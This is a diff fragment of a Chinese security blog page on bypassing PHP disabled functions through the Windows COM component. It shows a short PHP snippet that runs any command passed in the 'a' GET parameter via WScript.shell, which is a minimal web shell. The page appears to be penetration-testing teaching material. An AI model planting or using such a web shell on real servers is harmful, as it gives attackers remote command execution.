@@ -323,7 +323,10 @@
 
 
             <div class="entry pink-link-context">
-                <h2 id="0x01-利用系统组件绕过"><a href="#0x01-利用系统组件绕过" class="headerlink" title="0x01 利用系统组件绕过"></a>0x01 利用系统组件绕过</h2><h3 id="1．window-com组件-php-5-4-高版本扩展要自己添加）"><a href="#1．window-com组件-php-5-4-高版本扩展要自己添加）" class="headerlink" title="1．window com组件(php 5.4)(高版本扩展要自己添加）"></a>1．window com组件(php 5.4)(高版本扩展要自己添加）</h3><p>(COM组件它最早的设计意图是，跨语言实现程序组件的复用。)</p>
+                <blockquote>
+<p>更全面的一篇文章</p>
+</blockquote>
+<h2 id="0x01-利用系统组件绕过"><a href="#0x01-利用系统组件绕过" class="headerlink" title="0x01 利用系统组件绕过"></a>0x01 利用系统组件绕过</h2><h3 id="1．window-com组件-php-5-4-高版本扩展要自己添加）"><a href="#1．window-com组件-php-5-4-高版本扩展要自己添加）" class="headerlink" title="1．window com组件(php 5.4)(高版本扩展要自己添加）"></a>1．window com组件(php 5.4)(高版本扩展要自己添加）</h3><p>(COM组件它最早的设计意图是，跨语言实现程序组件的复用。)</p>
 <p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529112402837-836723313.png" alt="img"> </p>
 <p>测试:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">&quot;cmd /c&quot;</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
